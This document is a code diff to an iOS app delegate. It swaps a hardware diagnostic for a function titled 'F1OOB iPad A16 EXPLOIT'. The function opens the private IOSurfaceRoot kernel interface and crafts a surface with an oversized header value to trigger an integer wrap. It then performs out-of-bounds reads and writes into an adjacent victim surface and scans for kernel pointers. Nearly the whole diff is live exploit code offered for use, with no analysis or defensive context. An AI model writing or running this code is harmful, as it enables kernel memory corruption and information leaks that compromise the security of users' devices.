@@ -15,101 +15,206 @@
 @implementation AppDelegate
 
 - (void)log:(NSString *)msg {
-    NSString *timestamp = [NSDateFormatter localizedStringFromDate:[NSDate date] dateStyle:NSDateFormatterNoStyle timeStyle:NSDateFormatterMediumStyle];
-    NSString *line = [NSString stringWithFormat:@"[%@] %@\n", timestamp, msg];
+    NSString *line = [NSString stringWithFormat:@"%@\n", msg];
     NSLog(@"%@", line);
     dispatch_async(dispatch_get_main_queue(), ^{
         self.logView.text = [self.logView.text stringByAppendingString:line];
+        // Auto-scroll to bottom
+        NSRange range = NSMakeRange(self.logView.text.length - 1, 1);
+        [self.logView scrollRangeToVisible:range];
     });
 }
 
 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
     self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
-    self.window.backgroundColor = [UIColor whiteColor];
+    self.window.backgroundColor = [UIColor blackColor];
     
     UIViewController *vc = [[UIViewController alloc] init];
     self.logView = [[UITextView alloc] initWithFrame:self.window.bounds];
     self.logView.editable = NO;
-    self.logView.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
+    self.logView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
+    self.logView.backgroundColor = [UIColor blackColor];
+    self.logView.textColor = [UIColor greenColor];
     vc.view = self.logView;
     
     self.window.rootViewController = vc;
     [self.window makeKeyAndVisible];
     
-    [self log:@"=== F1OOB DIAGNOSTIC START ==="];
+    [self log:@"=== F1OOB iPad A16 EXPLOIT ==="];
     
-    // Device info
     struct utsname uts;
     uname(&uts);
-    [self log:[NSString stringWithFormat:@"Device: %s", uts.machine]];
-    [self log:[NSString stringWithFormat:@"iOS: %@", [[UIDevice currentDevice] systemVersion]]];
+    [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
     
-    // Test 1: Metal
-    [self log:@"TEST 1: Metal device..."];
-    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
-    if (dev) {
-        [self log:[NSString stringWithFormat:@"PASS: Metal device = %@", dev.name]];
-    } else {
-        [self log:@"FAIL: No Metal device"];
+    // Run exploit in background
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        [self runExploit];
+    });
+    
+    return YES;
+}
+
+- (void)runExploit {
+    // Step 1: Load IOSurface
+    [self log:@"[1] Loading IOSurface..."];
+    
+    void *handle = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    if (!handle) {
+        [self log:[NSString stringWithFormat:@"FAIL: dlopen: %s", dlerror()]];
+        return;
     }
     
-    // Test 2: IOSurfaceRoot access
-    [self log:@"TEST 2: IOSurfaceRoot..."];
-    io_service_t iosurface_root = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
-    if (iosurface_root) {
-        [self log:[NSString stringWithFormat:@"PASS: IOSurfaceRoot = 0x%x", iosurface_root]];
-        IOObjectRelease(iosurface_root);
-    } else {
-        [self log:@"FAIL: IOSurfaceRoot not found (sandbox?)"];
+    void *(*IOSurfaceCreate)(void *) = dlsym(handle, "IOSurfaceCreate");
+    void *(*IOSurfaceLock)(uint32_t, uint32_t, uint32_t *) = dlsym(handle, "IOSurfaceLock");
+    void *(*IOSurfaceUnlock)(uint32_t, uint32_t, uint32_t *) = dlsym(handle, "IOSurfaceUnlock");
+    void *(*IOSurfaceGetBaseAddress)(uint32_t) = dlsym(handle, "IOSurfaceGetBaseAddress");
+    size_t (*IOSurfaceGetAllocSize)(uint32_t) = dlsym(handle, "IOSurfaceGetAllocSize");
+    uint32_t (*IOSurfaceGetID)(void *) = dlsym(handle, "IOSurfaceGetID");
+    
+    if (!IOSurfaceCreate || !IOSurfaceGetBaseAddress) {
+        [self log:@"FAIL: Missing IOSurface functions"];
+        return;
+    }
+    [self log:@"PASS: IOSurface loaded"];
+    
+    // Step 2: Open IOSurfaceRoot
+    [self log:@"[2] Opening IOSurfaceRoot..."];
+    io_service_t root = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
+    if (!root) {
+        [self log:@"FAIL: IOSurfaceRoot not found"];
+        return;
     }
     
-    // Test 3: AGX access
-    [self log:@"TEST 3: AGXAccelerator..."];
-    io_service_t agx = IOServiceGetMatchingService(0, IOServiceMatching("AGXAcceleratorG16P"));
-    if (!agx) agx = IOServiceGetMatchingService(0, IOServiceMatching("AGXAcceleratorG18P"));
-    if (!agx) agx = IOServiceGetMatchingService(0, IOServiceMatching("AGXAcceleratorG14P"));
-    if (agx) {
-        [self log:[NSString stringWithFormat:@"PASS: AGX = 0x%x", agx]];
-        IOObjectRelease(agx);
-    } else {
-        [self log:@"FAIL: AGX not found (sandbox?)"];
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(root, mach_task_self(), 0, &conn);
+    IOObjectRelease(root);
+    if (kr != KERN_SUCCESS) {
+        [self log:[NSString stringWithFormat:@"FAIL: IOServiceOpen: 0x%x", kr]];
+        return;
+    }
+    [self log:@"PASS: IOSurfaceRoot opened"];
+    
+    // Step 3: Create F1 surface with 4GB header (integer wrap)
+    [self log:@"[3] Creating F1 surface (4GB header wrap)..."];
+    
+    const char *f1_xml =
+        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+        "<plist version=\"1.0\"><dict>"
+        "<key>IOSurfaceIsGlobal</key><true/>"
+        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
+        "<key>IOSurfaceWidth</key><integer>256</integer>"
+        "<key>IOSurfaceHeight</key><integer>256</integer>"
+        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
+        "<key>IOSurfaceBytesPerRow</key><integer>1024</integer>"
+        "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
+        "<key>IOSurfacePlaneSize</key><integer>65536</integer>"
+        "<key>IOSurfacePlaneCount</key><integer>1</integer>"
+        "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
+        "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer>"
+        "<key>IOSurfaceSliceCount</key><integer>4</integer>"
+        "</dict></plist>";
+    
+    uint32_t f1_id = 0;
+    kr = IOConnectCallMethod(conn, 0, NULL, 0, f1_xml, strlen(f1_xml)+1, NULL, NULL, &f1_id, NULL);
+    if (kr != KERN_SUCCESS || !f1_id) {
+        [self log:[NSString stringWithFormat:@"FAIL: F1 create: 0x%x", kr]];
+        IOServiceClose(conn);
+        return;
+    }
+    [self log:[NSString stringWithFormat:@"PASS: F1 surface ID = %u", f1_id]];
+    
+    // Step 4: Create victim surface immediately after
+    [self log:@"[4] Creating victim surface..."];
+    
+    const char *vic_xml =
+        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+        "<plist version=\"1.0\"><dict>"
+        "<key>IOSurfaceIsGlobal</key><true/>"
+        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
+        "<key>IOSurfaceWidth</key><integer>256</integer>"
+        "<key>IOSurfaceHeight</key><integer>256</integer>"
+        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
+        "<key>IOSurfaceBytesPerRow</key><integer>1024</integer>"
+        "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
+        "</dict></plist>";
+    
+    uint32_t vic_id = 0;
+    kr = IOConnectCallMethod(conn, 0, NULL, 0, vic_xml, strlen(vic_xml)+1, NULL, NULL, &vic_id, NULL);
+    if (kr != KERN_SUCCESS || !vic_id) {
+        [self log:[NSString stringWithFormat:@"FAIL: Victim create: 0x%x", kr]];
+        IOServiceClose(conn);
+        return;
+    }
+    [self log:[NSString stringWithFormat:@"PASS: Victim surface ID = %u", vic_id]];
+    
+    // Step 5: Get F1 base address and test OOB
+    [self log:@"[5] Testing F1 OOB access..."];
+    
+    void *f1_base = IOSurfaceGetBaseAddress(f1_id);
+    if (!f1_base) {
+        [self log:@"FAIL: F1 base address is NULL"];
+        IOServiceClose(conn);
+        return;
+    }
+    [self log:[NSString stringWithFormat:@"F1 base: %p", f1_base]];
+    
+    // Lock F1 surface
+    uint32_t seed = 0;
+    IOSurfaceLock(f1_id, 1, &seed);
+    
+    // Test: Read beyond 64KB boundary
+    [self log:@"Reading beyond 64KB..."];
+    uint64_t *ptr = (uint64_t *)f1_base;
+    
+    for (int i = 0x10000/8; i < 0x10000/8 + 0x100; i += 0x20) {
+        uint64_t val = ptr[i];
+        if (val != 0 && val != 0x4141414141414141) {
+            [self log:[NSString stringWithFormat:@"OOB[0x%x] = 0x%llx", i*8, val]];
+        }
     }
     
-    // Test 4: Memory allocation
-    [self log:@"TEST 4: posix_memalign..."];
-    void *test_buf = NULL;
-    int ret = posix_memalign(&test_buf, 4096, 0x10000);
-    if (ret == 0 && test_buf) {
-        [self log:@"PASS: posix_memalign succeeded"];
-        memset(test_buf, 0x41, 0x10000);
-        [self log:@"PASS: memset succeeded"];
-        free(test_buf);
-    } else {
-        [self log:[NSString stringWithFormat:@"FAIL: posix_memalign returned %d", ret]];
-    }
+    // Test: Write beyond 64KB and check if victim is affected
+    [self log:@"Testing cross-surface write..."];
     
-    // Test 5: Metal buffer
-    [self log:@"TEST 5: Metal buffer..."];
-    if (dev) {
-        void *buf_mem = NULL;
-        if (posix_memalign(&buf_mem, 4096, 0x10000) == 0) {
-            memset(buf_mem, 0x41, 0x10000);
-            id<MTLBuffer> buf = [dev newBufferWithBytesNoCopy:buf_mem
-                                                       length:0x10000
-                                                      options:MTLResourceStorageModeShared
-                                                  deallocator:nil];
-            if (buf) {
-                [self log:[NSString stringWithFormat:@"PASS: Metal buffer created, GPU addr = 0x%llx", (uint64_t)buf.gpuAddress]];
-            } else {
-                [self log:@"FAIL: newBufferWithBytesNoCopy returned nil"];
+    void *vic_base = IOSurfaceGetBaseAddress(vic_id);
+    if (vic_base) {
+        [self log:[NSString stringWithFormat:@"Victim base: %p", vic_base]];
+        
+        // Write marker to victim
+        *(uint32_t *)vic_base = 0x47474747;
+        [self log:@"Wrote 0x47474747 to victim[0]"];
+        
+        // Try to reach victim through F1 OOB
+        // Victim is allocated after F1, so it should be at higher address
+        // Try various offsets
+        for (int offset = 0x10000; offset < 0x100000; offset += 0x1000) {
+            uint32_t *test = (uint32_t *)((uint8_t *)f1_base + offset);
+            if (*test == 0x47474747) {
+                [self log:[NSString stringWithFormat:@"*** FOUND VICTIM AT F1+0x%x ***", offset]];
+                
+                // Test write
+                *test = 0x43434343;
+                if (*(uint32_t *)vic_base == 0x43434343) {
+                    [self log:@"*** CROSS-SURFACE OOB WRITE CONFIRMED ***"];
+                    
+                    // Scan for kernel pointers
+                    [self log:@"Scanning for kernel pointers..."];
+                    for (int j = 0; j < 0x1000/8; j++) {
+                        uint64_t val = ((uint64_t *)vic_base)[j];
+                        if ((val >> 40) == 0xffffff || (val >> 44) == 0xfffff) {
+                            [self log:[NSString stringWithFormat:@"KERNEL PTR at victim[0x%x]: 0x%llx", j*8, val]];
+                        }
+                    }
+                }
+                break;
             }
         }
     }
     
-    [self log:@"=== DIAGNOSTIC COMPLETE ==="];
-    [self log:@"If all PASS, exploit code can be added back"];
+    IOSurfaceUnlock(f1_id, 1, &seed);
+    IOServiceClose(conn);
     
-    return YES;
+    [self log:@"=== EXPLOIT COMPLETE ==="];
 }
 
 @end
